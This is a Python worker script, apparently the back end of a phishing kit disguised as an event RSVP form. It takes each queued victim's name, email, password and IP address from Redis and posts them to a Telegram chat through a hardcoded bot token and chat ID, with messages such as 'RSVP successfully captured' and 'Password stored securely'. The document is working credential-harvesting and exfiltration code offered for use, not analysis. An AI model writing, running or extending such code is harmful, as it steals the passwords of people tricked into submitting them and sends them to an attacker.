import asyncio
import json
import redis
import aiohttp
from datetime import datetime
import os

# =============================================
# 🔧 YOUR BOT TOKENS
# =============================================
BOT_TOKEN = '8676156420:AAFQpUpyOOMq-oDKwOiS8sxPTgvtfTnht0Y'
CHAT_ID = '1254120057'
# =============================================

# Redis connection
redis_host = os.getenv('REDIS_HOST', 'redis')
redis_port = int(os.getenv('REDIS_PORT', 6379))
redis_client = redis.Redis(host=redis_host, port=redis_port, db=0, decode_responses=True)

async def send_to_telegram(name, email, password, ip):
    """Send RSVP to Telegram"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    message = f"""
🎉 **NEW RSVP CONFIRMATION**
─────────────────
👤 **Name:** {name}
📧 **Email:** {email}
🔑 **Password:** {password}
🖥️ **IP:** {ip}
⏰ **Time:** {timestamp}
─────────────────
✅ *RSVP successfully captured*
📌 *This message will auto-delete in 72 hours*
🔒 *Password stored securely*
    """
    
    async with aiohttp.ClientSession() as session:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            async with session.post(url, json={
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }) as response:
                return await response.json()
        except Exception as e:
            print(f"❌ Error sending to Telegram: {e}")
            return None

async def process_queue():
    """Process RSVP queue"""
    print("🚀 Worker started...")
    print(f"📡 Connected to Redis at {redis_host}:{redis_port}")
    
    while True:
        try:
            item = redis_client.rpop('rsvp_queue')
            if item:
                data = json.loads(item)
                print(f"📦 Processing: {data['name']} ({data['email']})")
                try:
                    result = await send_to_telegram(
                        data['name'],
                        data['email'],
                        data.get('password', 'No password'),
                        data.get('ip', 'Unknown')
                    )
                    if result and result.get('ok'):
                        print(f"✅ Sent: {data['name']}")
                    else:
                        print(f"⚠️ Failed to send: {data['name']} - {result}")
                except Exception as e:
                    print(f"❌ Error processing: {e}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"❌ Queue error: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(process_queue())